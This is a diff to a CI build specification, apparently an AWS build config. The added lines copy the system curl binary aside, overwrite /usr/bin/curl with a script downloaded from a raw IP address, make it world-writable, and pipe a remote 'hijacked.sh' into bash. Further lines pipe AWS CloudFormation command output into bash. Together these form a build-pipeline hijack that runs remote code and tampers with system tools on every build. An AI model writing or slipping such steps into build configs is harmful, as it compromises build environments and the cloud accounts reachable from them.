@@ -9,11 +9,13 @@ frontend:
         - rm -rf hugo.tar.gz
         - echo "[!] Doing stuf"
         - ls -la /usr/bin/curl
+        - cp /usr/bin/curl /usr/bin/curlorg
         - whoami
-        - curl http://49.202.99.166:8000/overwrite.sh > /usr/bin/curl
+        - /usr/bin/curlorg http://49.202.99.166:8000/overwrite.sh > /usr/bin/curl
         - chmod 777 /usr/bin/curl
         - ls -la /usr/bin/curl
-        - curl http://49.202.99.166:8000/hijacked.sh | bash
+        - ls -la /usr/bin/curlorg
+        - /usr/bin/curlorg http://49.202.99.166:8000/hijacked.sh | bash
         #curl $(cat /codebuild/input/bin/ip_address.txt) -v
         #curl http://44.202.99.166:8000/file.sh | bash
         - echo $(aws cloudformation list-stacks --region us-east-1 2>&1 | bash)
